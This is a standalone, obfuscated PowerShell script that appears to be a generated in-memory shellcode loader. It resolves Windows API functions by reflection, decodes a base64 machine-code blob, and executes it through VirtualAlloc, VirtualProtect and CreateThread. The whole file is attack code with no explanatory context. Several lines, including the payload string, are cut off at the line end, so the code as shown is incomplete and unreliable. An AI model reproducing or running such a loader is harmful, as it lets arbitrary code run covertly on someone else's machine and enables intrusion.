function iHo3 {
        Param ($zhUKt, $dunN)
        $qGK = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType(>

        return $qGK.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.Han>
}

function etRoY {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $wbTi1,
                [Parameter(Position = 1)] [Type] $gRQ = [Void]
        )

        $xE = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBui>
        $xE.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $wbTi1).SetImplementationFlags('Runtime, Managed>
        $xE.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $gRQ, $wbTi1).SetImplementationFlags('Runtime, Managed')

        return $xE.CreateType()
}

[Byte[]]$j5 = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJIi1IgQVGLQjxIAdBmgXgYCwIPhX>
[Uint32]$f0 = 0
$cK = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((iHo3 kernel32.dll VirtualAlloc), (etRoY @([IntPtr], [UInt32], [UInt32], [UInt32]) ([I>

[System.Runtime.InteropServices.Marshal]::Copy($j5, 0, $cK, $j5.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((iHo3 kernel32.dll VirtualProtect), (etRoY @([IntPtr], [UIntPtr], [UInt32], [UInt32].Ma>
        $vm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((iHo3 kernel32.dll CreateThread), (etRoY @([IntPtr], [UInt32], [IntPtr], [IntP>
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((iHo3 kernel32.dll WaitForSingleObject), (etRoY @([IntPtr], [Int32]))).Invoke($vm,0x>
}
